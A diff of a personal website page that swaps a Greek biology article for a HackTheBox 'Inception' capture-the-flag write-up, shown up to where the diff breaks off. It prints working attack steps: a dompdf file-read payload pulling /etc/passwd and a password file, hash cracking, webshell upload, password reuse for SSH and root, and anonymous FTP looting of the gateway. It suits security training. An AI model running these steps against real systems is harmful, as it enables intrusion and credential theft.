@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>Microvilli (available in greek only) - The Portal of Knowledge</title>
-  <meta property='og:title' content="Microvilli (available in greek only) - The Portal of Knowledge">
+  <title>Inception write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="Inception write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="This article is available only in greek. Οι μικρολάχνες (microvilli, ενικός: microvillus) είναι μικροσκοπικές δακτυλιοειδείς προεκβολές της κυτταρικής μεμβράνης που αυξάνουν την επιφάνειά της και εμπλέκονται σε πληθώρα λειτουργιών.">
-  <meta property="og:description" content="This article is available only in greek. Οι μικρολάχνες (microvilli, ενικός: microvillus) είναι μικροσκοπικές δακτυλιοειδείς προεκβολές της κυτταρικής μεμβράνης που αυξάνουν την επιφάνειά της και εμπλέκονται σε πληθώρα λειτουργιών.">
-  <meta property="og:image" content="https://alamot.github.io/images/microvilli.jpg">
+  <meta name="description" content="Write-up for the Inception machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Inception του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Inception machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Inception του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/mirror.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/microvilli/">
+<meta property="og:url" content="https://alamot.github.io/inception_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "Microvilli (available in greek only) |  ",
+    "headline": "Inception write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2010-01-08T00:00:00JST",
-    "dateModified": "2010-01-08T00:00:00JST",
+    "datePublished": "2018-04-14T00:00:00JST",
+    "dateModified": "2018-04-14T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -198,10 +198,20 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
         
         
          
-<li><a href="#εισαγωγή">Εισαγωγή</a></li>
-<li><a href="#δομή-μικρολαχνών">Δομή μικρολαχνών</a></li>
-<li><a href="#μικρολάχνες-ηπατοκυττάρων">Μικρολάχνες ηπατοκυττάρων</a></li>
-<li><a href="#βιβλιογραφία">Βιβλιογραφία</a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+</ul></li>
+<li><a href="#getting-shell">Getting shell</a>
+<ul>
+<li><a href="#webshell">Webshell</a></li>
+<li><a href="#ssh-shell">SSH shell</a></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="#getting-root-flag">Getting root flag</a></li>
+<li><a href="#getting-root-shell-on-192-168-0-1-via-ssh">Getting root shell (on 192.168.0.1 via SSH)</a></li>
+</ul></li>
  
       
         <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
@@ -243,25 +253,30 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/microvilli.jpg);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">Microvilli (available in greek only)</h1></header>
-            <header lang="el"><h1 class="title">Μικρολάχνες</h1></header>
+            <header lang="en"><h1 id="title" class="title">Inception write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Inception</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">08 Jan 2010</time>
-            <time lang="el" class="topmargin7">08 Ιαν 2010</time>
+            <time lang="en" class="topmargin7">14 Apr 2018</time>
+            <time lang="el" class="topmargin7">14 Απρ 2018</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/biology'>
-                <span lang="en">Biology</span>
-                <span lang="el">Βιολογία</span>
+              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
+                <span lang="en">Cybersecurity</span>
+                <span lang="el">Κυβερνοασφάλεια</span>
               </a>
             
             &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/microvilli'>
-                <span lang="en">microvilli</span>
-                <span lang="el">μικρολάχνες</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
+                <span lang="en">hackthebox</span>
+                <span lang="el">hackthebox</span>
+                </a>
+            
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/linux'>
+                <span lang="en">linux</span>
+                <span lang="el">linux</span>
                 </a>
             
          
@@ -271,10 +286,20 @@ if (language) {
             <header lang="el"><h2>Περιεχόμενα</h2></header>
             <div><nav id="TableOfContents">
 <ul>
-<li><a href="#εισαγωγή">Εισαγωγή</a></li>
-<li><a href="#δομή-μικρολαχνών">Δομή μικρολαχνών</a></li>
-<li><a href="#μικρολάχνες-ηπατοκυττάρων">Μικρολάχνες ηπατοκυττάρων</a></li>
-<li><a href="#βιβλιογραφία">Βιβλιογραφία</a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+</ul></li>
+<li><a href="#getting-shell">Getting shell</a>
+<ul>
+<li><a href="#webshell">Webshell</a></li>
+<li><a href="#ssh-shell">SSH shell</a></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="#getting-root-flag">Getting root flag</a></li>
+<li><a href="#getting-root-shell-on-192-168-0-1-via-ssh">Getting root shell (on 192.168.0.1 via SSH)</a></li>
+</ul></li>
 </ul>
 </nav></div>
           </section>
@@ -282,79 +307,389 @@ if (language) {
         
         
 
-<h1 id="εισαγωγή">Εισαγωγή</h1>
+<h1 id="enumeration">Enumeration</h1>
 
-<p>Οι <strong><em>μικρολάχνες</em></strong> (<em>microvilli</em>, ενικός: <em>microvillus</em>) είναι μικροσκοπικές δακτυλιοειδείς προεκβολές της κυτταρικής μεμβράνης που αυξάνουν την επιφάνειά της και εμπλέκονται σε πληθώρα λειτουργιών όπως είναι:</p>
+<h2 id="port-scanning">Port scanning</h2>
 
-<ul>
-<li>η μεταφορά (απορρόφηση/έκκριση) ουσιών (π.χ. επιθηλιακά κύτταρα εντέρου, ηπατοκύτταρα, κύτταρα στο εγγύς εσπειραμένο σωληνάριο των νεφρών, επιθηλιακά κύτταρα επιδιδυμίδας)</li>
-<li>η υποδοχή ερεθισμάτων (π.χ. κύτταρα του οσφρητικού επιθήλιου, κύτταρα των γευστικών καλύκων, οι «στερεοβλεφαρίδες» στα τριχωτά κύτταρα του οργάνου του Corti στο αυτί)</li>
-<li>η κυτταρική προσκόλληση (π.χ. στην αναπαραγωγή η αγκυροβόληση σπερματοκύτταρων στα ωάρια γίνεται με τη συμβολή μικρολαχνών και των δύο κυττάρων, ενώ στην άμυνα οι μικρολάχνες της επιφάνειας των λευκοκυττάρων βοηθούν μεταξύ άλλων στη μετανάστευση τους)</li>
-</ul>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.67
 
-<p>Φαίνεται ότι οι μικρολάχνες αν και γενικά διακρίνονται από σχετική ακαμψία έχουν την ικανότητα κάποιας περιορισμένης κίνησης και μάλιστα σε μερικά κύτταρα, όπως λ.χ. στα ηπατικά, έχουν τη δυνατότητα να αποσύρονται ή να εκτείνονται.</p>
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-04-14 09:24:04 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65536 ports/host]
+Discovered open port 80/tcp on 10.10.10.67                                     
+Discovered open port 3128/tcp on 10.10.10.67   </code></pre></div></div>
 
-<p>Το μέγεθος των μικρολαχνών ποικίλει ανάλογα με τη λειτουργία τους, τον ιστό, το άτομο και το είδος. Γενικά έχουν μια διάμετρο της τάξης των 50-100 nm ενώ το μήκος τους κυμαίνεται από 100 nm έως πάνω από 2000 nm.</p>
+<p>We found TCP ports 80 and 3128 open. Let&rsquo;s explore them using nmap:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p80,3128 10.10.10.67
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-14 12:28 EEST
+Nmap scan report for 10.10.10.67
+Host is up (0.085s latency).
 
-<figure>
-<a title="By BallenaBlanca [CC BY-SA 4.0 (http://creativecommons.org/licenses/by-sa/4.0)], via Wikimedia Commons" href="https://commons.wikimedia.org/wiki/File%3AVilli_%26_microvilli_of_small_intestine.svg" target="_blank"><img width="512" alt="Λάχνες και μικρολάχνες του λεπτού εντέρου" title="Λάχνες και μικρολάχνες του λεπτού εντέρου" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Villi_%26_microvilli_of_small_intestine.svg/512px-Villi_%26_microvilli_of_small_intestine.svg.png"/></a>
-<figcaption class="centered">Λάχνες και μικρολάχνες του λεπτού εντέρου</figcaption>
-</figure>
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Inception
+3128/tcp open  http-proxy Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops</code></pre></div></div></p>
 
-<h1 id="δομή-μικρολαχνών">Δομή μικρολαχνών</h1>
+<h1 id="getting-shell">Getting shell</h1>
 
-<p>Οι μικρολάχνες σε εγκάρσιες τομές έχουν περίπου σφαιρικό σχήμα, ενώ σε επιμήκεις τομές σχεδόν κυλινδρικό. Πρόκειται για μικροσκοπικές δακτυλιοειδείς δομές που καλύπτονται από πλασματική μεμβράνη που περικλείει κυτταρόπλασμα και μια πυκνή δέσμη 10-50 <strong><em>μικροϊνιδίων ακτίνης</em></strong>, τα οποία διασυνδέονται μέσω των πρωτεϊνών <em>φιμπρίνη</em> και <em>βιλλίνη</em> ή <em>φασίνη</em> για το σχηματισμό του <em>πυρήνα</em> (κέντρο) της μικρολάχνης. Αυτός ο δομικός πυρήνας ενώνεται με την κυτταρική μεμβράνη μέσω πλευρικών βραχιόνων που αποτελούνται από <em>μυοσίνη Ι</em> και <em>καλμοδούλινη</em> (πρωτεΐνη που δεσμεύει Ca<sup>2+</sup>). Στην πρόσδεση των ινιδίων ακτίνης με την πλασματική μεμβράνη παίζουν σημαντικό ρόλο και οι πρωτεΐνες της <strong>οικογένειας ERM</strong> (<em>Ezrin</em>, <em>Radixin</em>, <em>Moesin</em>). Το θετικό άκρο των μικροϊνιδίων ακτίνης συγκεντρώνεται στην κορυφή της μικρολάχνης όπου πιθανότατα καλύπτεται από άμορφες πρωτεΐνες καλύμματος που παρέχουν προστασία έναντι του αποπολυμερισμού, ενώ το αρνητικό άκρο προσδένεται στην «τερματική ζώνη».</p>
+<p>If we view the the source code of the main page (view-source:<a href="http://10.10.10.67/" target="_blank">http://10.10.10.67/</a>) we notice a comment:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+&lt;!-- Todo: test dompdf on php 7.x --&gt;
+...</code></pre></div></p>
 
-<figure>
-<img class="bordered" src="/images/microvilli_structure.jpg" alt="Σχεδιάγραμμα της δομής των μικρολαχνών" title="Σχεδιάγραμμα της δομής των μικρολαχνών">
-<figcaption class="centered">Σχεδιάγραμμα της δομής των μικρολαχνών</figcaption>
-</figure>
+<p>Let&rsquo;s try to visit <a href="http://10.10.10.67/dompdf/" target="_blank">http://10.10.10.67/dompdf/</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Index of /dompdf
+[ICO]       Name                         Last modified       Size
+[PARENTDIR] Parent Directory         -
+[   ]       CONTRIBUTING.md              2014-01-26 20:25    3.1K
+[   ]       LICENSE.LGPL                 2013-05-24 03:47    24K
+[   ]       README.md                    2014-02-07 03:30    4.8K
+[   ]       VERSION                      2014-02-07 06:35    5
+[   ]       composer.json                2014-02-02 08:33    559
+[   ]       dompdf.php                   2013-05-24 03:47    6.9K
+[   ]       dompdf_config.custom.inc.php 2013-11-07 04:45    1.2K
+[   ]       dompdf_config.inc.php        2017-11-06 02:21    13K
+[DIR]       include/                     2014-02-08 01:00    -
+[DIR]       lib/                         2014-02-08 01:00    -
+[   ]       load_font.php                2013-05-24 03:47    5.2K
+Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</code></pre></div></p>
 
-<p>Η <strong>τερματική ζώνη</strong> αποτελεί τη βάση των μικρολαχνών και αποτελείται από λεπτά οριζόντια ινίδια ακτίνης, συνδεδεμένα με ένα πολύπλοκο σύνολο από πρωτεΐνες που κατανέμονται:</p>
+<p>Nice. Let&rsquo;s check its version <a href="http://10.10.10.67/dompdf/VERSION" target="_blank">http://10.10.10.67/dompdf/VERSION</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">0.6.0</code></pre></div></p>
 
-<ul>
-<li>στις ρίζες των μικρολαχνών (<em>καλδεσμίνη</em>, <em>τροπομυοσίνη</em>, <em>βιλλίνη</em>)</li>
-<li>στις μεσόριζες (<em>μυοσίνη ΙΙ</em>, <em>TW260/240</em> ή <em>σπεκτρίνη</em>)</li>
-<li>στον περιφερειακό δακτύλιο (<em>τροπομυοσίνη</em>, <em>βινκουλίνη</em>, <em>α-ακτινίνη</em>).</li>
-</ul>
+<p>Now, we can search for exploits:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ searchsploit dompdf 0.6.0 -w
+-------------------------------------------------------
+dompdf 0.6.0 - &#39;dompdf.php?read&#39; Arbitrary File Read
+    https://www.exploit-db.com/exploits/33004/
+dompdf 0.6.0 beta1 - Remote File Inclusion
+    https://www.exploit-db.com/exploits/14851/
+-------------------------------------------------------</code></pre></div></div></p>
 
-<p>Κάτω από τα οριζόντια ινίδια ακτίνης, υπάρχει ένα οριζόντιο δίκτυο από <em>ενδιάμεσα ινίδια</em>. Διάχυτες στην περιοχή των μικρολαχνών, χωρίς να έχει εντοπιστεί ακόμα ειδική θέση τους, ανιχνεύονται οι πρωτεΐνες <em>πηκτωληματίνη</em>, <em>φιλαμίνη</em> και <em>καλπακτίνη</em>.</p>
+<p>Exploit 33004 inform us for arbitrary file read vulnerability is present on dompdf.php file:
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=&lt;PATH_TO_THE_FILE&gt;</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></code></pre></div></p>
 
-<p>Στο κυτταρόπλασμα των μικρολαχνών γενικά δεν εντοπίζονται κυτταρικά οργανίδια. Η κυτταρική μεμβράνη που καλύπτει τη μικρολάχνη μπορεί να περιέχει πρωτεΐνες μεταφορείς, υποδοχείς, ένζυμα, γλυκοπρωτεΐνες κ.λπ. ανάλογα με τη λειτουργία που αυτή επιτελεί.</p>
+<p>Let&rsquo;s test it <a href="http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd" target="_blank">http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+cobb:x:1000:1000::/home/cobb:/bin/bash
+ftp:x:107:112:ftp daemon,,,:/srv/ftp:/bin/false
+...</code></pre></div></p>
 
-<h1 id="μικρολάχνες-ηπατοκυττάρων">Μικρολάχνες ηπατοκυττάρων</h1>
+<p>Nice! It works. Now, let&rsquo;s examine some interesting files:
+<a href="http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf" target="_blank">http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+    Alias /webdav_test_inception /var/www/html/webdav_test_inception
+    &lt;Location /webdav_test_inception&gt;
+        Options FollowSymLinks
+        DAV On
+        AuthType Basic
+        AuthName &#34;webdav test credential&#34;
+        AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
+        Require valid-user
+    &lt;/Location&gt;
+...</code></pre></div></p>
 
-<p>Πολυάριθμες ανομοιογενείς μικρολάχνες που ποικίλουν σε μήκος εκτείνονται από την <strong>βασεοπλευρική επιφάνεια</strong> (ενδοκρινή μοίρα) των ηπατοκυττάρων (παρεγχυματικά κύτταρα του ήπατος) μέσα στον <em>περικολποειδή χώρο του Disse</em> (<em>perisinusoidal Disse’s space</em>, <em>Spatium perisinusoideum</em>), αυξάνοντας έτσι σημαντικά την επιφάνεια ανταλλαγής ουσιών. Μεταξύ των βάσεων των μικρολαχνών βρίσκονται <em>επικαλυμμένα με κλαθρίνη βοθρία</em> (<em>clathrin-coated pits</em>), τα οποία συμμετέχουν στη διαδικασία της ενδοκύττωσης μέσω υποδοχέων. Επιτελείται απορρόφηση ουσιών από το αίμα (σάκχαρα, αμινοξέα, λιπίδια, χολερυθρίνη, χολικά άλατα, τοξικές ουσίες), ενώ εκκρίνονται ουσίες όπως π.χ. γλυκόζη ή πρωτεΐνες του πλάσματος (αλβουμίνη, ινωδογόνο, προθρομβίνη, παράγοντες πήξης V, VII και IX).</p>
+<h2 id="webshell">Webshell</h2>
 
-<figure>
-<img class="bordered" src="/images/hepatocyte_sinusoid.jpg" alt="Μικρολάχνες ηπατοκυττάρων στον περικολποειδή χώρο του Disse" title="Μικρολάχνες ηπατοκυττάρων στον περικολποειδή χώρο του Disse">
-<figcaption>Μικρολάχνες ηπατοκυττάρων στον περικολποειδή χώρο του Disse (SEM, μεγένθυνση x30.000).</figcaption>
-</figure>
+<p>Interesting! Let&rsquo;s see this webdav.passwd:  <a href="http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd" target="_blank">http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
+...</code></pre></div></p>
 
-<p>Κοντές μικρολάχνες προβάλουν επίσης και από την <strong>κορυφαία επιφάνεια</strong> (εξωκρινή μοίρα) των ηπατοκυττάρων στους χοληφόρους σωληνίσκους (<em>bile canaliculi</em>, <em>canaliculi biliferi</em>). Πρόκειται για στενά κανάλια που σχηματίζονται μεταξύ γειτονικών ηπατοκυττάρων. Στον αυλό τους εκκρίνεται η χολή.</p>
+<p>Let&rsquo;s find the hash type (don&rsquo;t forget to escape $ or enclose the whole hash in single quotes):
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashid \$apr1\$8rO7Smi4\$yqn7H.GvJFtsTou1a7VME0
+Analyzing &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
+[+] MD5(APR) 
+[+] Apache MD5
 
-<p lang="en" class="author">Antonios Tsolis</p>
-<p lang="el" class="author">Αντώνιος Τσώλης</p>
+$ hashid &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
+Analyzing &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39;
+[+] MD5(APR) 
+[+] Apache MD5 </code></pre></div></div></p>
 
-<h1 id="βιβλιογραφία">Βιβλιογραφία</h1>
+<p>Let&rsquo;s crack (i.e. reverse) this hash:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashcat -h | grep MD5 | grep APR
+   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server
 
-<ul>
-<li>Λ.Χ. Μαργαρίτης, Β.Κ. Γαλανόπουλος, Κ.Ε. Κεραμάρης, Ε.Σ. Μαρίνος, Ι.Σ. Παπασιδέρη, Δ.Ι. Στραβοπόδης, Ι.Π. Τρουγκάκος (2008), «Βιολογία Κυττάρου», 4η έκδοση,  Ιατρικές εκδόσεις Λίτσας.</li>
-<li>Nedra F. Wilson and William J. Snel, (1998), «Microvilli and cell-cell fusion during fertilization», Trends in Cell Biology (Vol. 8) March 1998.</li>
-<li>Amieva MR, Wilgenbus KK, Furthmayr H. (1994), «Radixin is a component of hepatocyte microvilli in situ», Exp Cell Res.</li>
-<li>Berryman M, Franck Z, Bretscher A. (1993), «Ezrin is concentrated in the apical microvilli of a wide variety of epithelial cells whereas moesin is found primarily in endothelial cells», J Cell Sci.</li>
-</ul>
+$ hashcat -m 1600 &#39;$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0&#39; /usr/share/dict/rockyou.txt
+...
+$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69
+...</code></pre></div></div></p>
+
+<p>Therefore our webdav login credentials are webdav_tester:babygurl69. If you try to obtain a usual shell you will discover soon that most kinds of traffic are blocked by the firewall. So, we are gonna upload a webshell to get us going:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cadaver
+dav:!&gt; open http://10.10.10.67/webdav_test_inception
+Authentication required for webdav test credential on server `127.0.1.1&#39;:
+Username: webdav_tester
+Password: babygurl69
+dav:/webdav_test_inception/&gt; put b374k.php
+Uploading b374k.php to `/webdav_test_inception/b374k.php&#39;:
+Progress: [=============================&gt;] 100.0% of 947 bytes succeeded.</code></pre></div></div></p>
+
+<p>Now, we can visit <a href="http://10.10.10.67/webdav_test_inception/b374k.php" target="_blank">http://10.10.10.67/webdav_test_inception/b374k.php</a> in order to have access to our webshell (use webdav_tester:babygurl69 again for credentials).</p>
+
+<h2 id="ssh-shell">SSH shell</h2>
+
+<p>If we explore the box a little, using our webshell, we are gonna find MySQL credentials inside /var/www/html/wordpress_4.8.3/wp-config.php:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+/** MySQL database username */ 
+define(&#39;DB_USER&#39;, &#39;root&#39;); 
+
+/** MySQL database password */ 
+define(&#39;DB_PASSWORD&#39;, &#39;VwPddNh7xMZyDQoByQL4&#39;);
+...</code></pre></div></p>
+
+<p>Remember, we know already a user name from /etc/passwd (cobb). Maybe that password for MySQL is re-used. Let&rsquo;s try it.
+First, add the squid proxy to /etc/proxychains.conf:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+http 10.10.10.67 3128
+...</code></pre></div></p>
+
+<p>Now try this:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ proxychains ssh cobb@127.0.1.1
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib64/libproxychains.so.4.12
+[proxychains] DLL init: proxychains-ng 4.12
+[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.1.1:22  ...  OK
+cobb@127.0.1.1&#39;s password: 
+Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Sat Apr 14 12:01:57 2018 from 127.0.0.1
+cobb@Inception:~$ </code></pre></div></div></p>
+
+<p>Yeah! It works! :D</p>
+
+<p>Now let&rsquo;s see if our cobb user has any sudo right:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">cobb@Inception:~$ sudo -l
+[sudo] password for cobb: VwPddNh7xMZyDQoByQL4
+Matching Defaults entries for cobb on Inception:
+   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User cobb may run the following commands on Inception:
+   (ALL : ALL) ALL
+   
+cobb@Inception:~$ sudo -i (or sudo su)
+Password: VwPddNh7xMZyDQoByQL4
+root@Inception:/home/cobb# whoami
+root</code></pre></div></div>
+Wow! We are root. Let&rsquo;s get this flag. :D</p>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:/home/cobb# cd /root
+root@Inception:~# cat root.txt
+You&#39;re waiting for a train. A train that will take you far away. Wake up to find root.txt</code></pre></div></div>
+
+<p>Well&hellip; not so soon. It appears that we are inside another box.</p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>Let&rsquo;s explore a little:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~# cat /etc/resolv.conf
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+nameserver 192.168.0.1
+
+root@Inception:~# arp -a
+? (192.168.0.1) at fe:ae:a2:b2:88:11 [ether] on eth0
+
+root@Inception:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:16:3e:28:53:63  
+          inet addr:192.168.0.10  Bcast:192.168.0.255  Mask:255.255.255.0
+          inet6 addr: fe80::216:3eff:fe28:5363/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:858019 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:583712 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:74512993 (74.5 MB)  TX bytes:106431159 (106.4 MB)
+...
+
+root@Inception:~# cat /etc/network/interfaces
+# This file describes the network interfaces available on your system
+# and how to activate them. For more information, see interfaces(5).
+
+# The loopback network interface
+auto lo
+iface lo inet loopback
+
+auto eth0
+iface eth0 inet static
+    address 192.168.0.10
+    netmask 255.255.255.0
+    gateway 192.168.0.1
+    dns-nameservers 192.168.0.1</code></pre></div></div></p>
+
+<p>Well, it seems we are 192.168.0.10 and our gateway is 192.168.0.1. Let&rsquo;s find what ports are listening on the gateway (Look mom! No need for nmap! :D):
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~# nc -zv 192.168.0.1 1-65535 &amp;&gt; results &amp;&amp; cat results | grep succeeded
+Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
+Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
+Connection to 192.168.0.1 53 port [tcp/domain] succeeded!</code></pre></div></div></p>
+
+<p>Well, well. Port 21 (i.e. FTP) is open. Let&rsquo;s try it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:/dev/shm# ftp 192.168.0.1
+Connected to 192.168.0.1.
+220 (vsFTPd 3.0.3)
+Name (192.168.0.1:cobb): anonymous
+331 Please specify the password.
+Password: anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt;</code></pre></div></div></p>
+
+<p>That&rsquo;s it! Now, if we explore a little the gateway, using our FTP access, we are gonna find some intresting things:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">ftp&gt; cd /etc
+250 Directory successfully changed.
+ftp&gt; get passwd
+local: passwd remote: passwd
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for passwd (1622 bytes).
+226 Transfer complete.
+1622 bytes received in 0.00 secs (4.0600 MB/s)
+ftp&gt; get crontab
+local: crontab remote: crontab
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for crontab (826 bytes).
+226 Transfer complete.
+826 bytes received in 0.00 secs (2.4464 MB/s)
+ftp&gt; cd default
+250 Directory successfully changed.
+ftp&gt; get tftpd-hpa
+local: tftpd-hpa remote: tftpd-hpa
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for tftpd-hpa (118 bytes).
+226 Transfer complete.
+118 bytes received in 0.00 secs (281.0594 kB/s)
+ftp&gt; exit
+221 Goodbye.
+root@Inception:~# cat passwd
+...
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:111:118:ftp daemon,,,:/srv/ftp:/bin/false
+tftp:x:112:119:tftp daemon,,,:/var/lib/tftpboot:/bin/false
+...
+
+root@Inception:~# cat tftpd-hpa
+# /etc/default/tftpd-hpa
+
+TFTP_USERNAME=&#34;root&#34;
+TFTP_DIRECTORY=&#34;/&#34;
+TFTP_ADDRESS=&#34;:69&#34;
+TFTP_OPTIONS=&#34;--secure --create&#34;
